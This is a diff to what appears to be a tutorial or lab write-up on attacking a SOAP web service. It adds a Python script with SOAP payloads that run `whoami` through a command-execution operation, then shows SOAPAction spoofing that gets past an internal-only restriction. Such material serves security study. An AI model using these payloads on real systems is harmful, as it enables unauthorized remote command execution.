@@ -22,7 +22,16 @@ Notice that there is a `cmd` parameter. The following Python script can be used 
 ```python
 import requests
 
-payload = ''
+payload = """
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
+<soap:Body>
+<ExecuteCommandRequest xmlns="http://tempuri.org/">
+<cmd>whoami</cmd>
+</ExecuteCommandRequest>
+</soap:Body>
+</soap:Envelope>
+"""
 
 req = requests.post(
 	'http://target-website.com/wsdl',
@@ -32,3 +41,19 @@ req = requests.post(
 
 print(req.content)
 ```
+
+When we execute this script, it will throw an error as the `ExecuteCommand` action is only allowed internally. However, not all is lost, we can still try for SOAPAction spoofing attack. To do this, we will replace our `payload` variable's value with the following:
+```
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
+<soap:Body>
+<LoginRequest xmlns="http://tempuri.org/">
+<cmd>whoami</cmd>
+</LoginRequest>
+</soap:Body>
+</soap:Envelope>
+```
+In our new payload, we did the following:
+- We specify `LoginRequest` in `<soap:Body>` instead, since this operation is allowed externally, our request will go through.
+- Inside the `LoginRequest`, we will specify the parameters of `ExecuteCommandRequest` because our aim is to achieve code execution.
+- We specify the blocked operation (`ExecuteCommand`) in the SOAPAction header
